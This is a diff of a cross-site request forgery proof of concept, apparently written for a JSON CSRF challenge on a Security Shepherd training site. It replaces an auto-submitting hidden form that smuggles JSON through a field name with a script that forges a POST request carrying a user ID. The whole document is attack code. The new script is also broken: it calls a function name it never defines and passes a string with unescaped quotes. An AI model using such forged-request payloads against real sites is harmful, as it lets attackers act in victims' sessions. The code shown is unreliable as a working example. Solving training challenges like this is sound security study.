@@ -4,13 +4,20 @@
 <form action="https://shepherd.websec.dedyn.io/user/csrfchallengejson/plusplus" method="POST" name="csrf" enctype="application/json">
 <!--input type="hidden" name="userId" value="398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8"/-->
 <!--input type="hidden" name="csrfToken" value="105700736606562306760126015519665357624"/-->
-<input type="hidden" name='{"userId"' value='"398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8"}'>
+<!--input type="hidden" name='{"userId"' value="398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8"}-->
 </form>
 <script>
-  document.csrf.submit();
+  function submitReq() {
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://shepherd.websec.dedyn.io//user/csrfchallengejson/plusplus", true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send("{"userId":"398a2626d934ee0e28e46e4c5d5c1cab10e1a9b8"}");
+  };
+  submitRequest();
 </script>
 </body>
 </html>
+
 
 
 
